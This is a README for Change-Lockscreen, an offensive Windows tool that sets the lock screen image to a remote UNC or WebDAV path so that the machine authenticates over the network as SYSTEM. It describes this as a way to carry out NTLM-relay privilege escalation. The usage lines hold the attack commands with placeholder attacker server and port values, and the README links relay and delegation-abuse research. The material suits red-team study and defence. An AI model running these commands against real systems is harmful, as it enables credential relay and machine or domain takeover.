# Change-Lockscreen

Change-Lockscreen is a tool to trigger network authentications as SYSTEM by changing the Windows lock screen image from the command line to perform privilege escalation attacks such as the one described in the post linked below:
*  (Link to Blog)

# Features

By default, Windows 10 has a feature called Windows Spotlight. It downloads and displays lock screen images automatically.
*	When this feature is enabled, Change-Lockscreen will disable it and establish the image specified in the arguments
*	Otherwise if the user has a custom lock screen image, Change-Lockscreen will be in charge to run a backup of it, trigger the network authentication, and establish it again

Note: while the PowerShell version of the tool works reliably, the C# version sometimes fails to restore the original image.

# Usage 

```
Change-Lockscreen -FullPath \\[imageserver]@[port]\[fakePath]\[image.jpg]
Change-Lockscreen -Webdav \\[imageserver]@[port]\ 
```

[![Watch the video](https://i.ytimg.com/vi/NsDQH1H89FQ/maxresdefault.jpg)](https://youtu.be/NsDQH1H89FQ)

# Authors
* Simone Salucci
* Daniel López Jiménez

# Acknowledgements

* https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
* https://gist.github.com/3xocyte/4ea8e15332e5008581febdb502d0139c
* https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
* https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/
* http://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/
* https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/

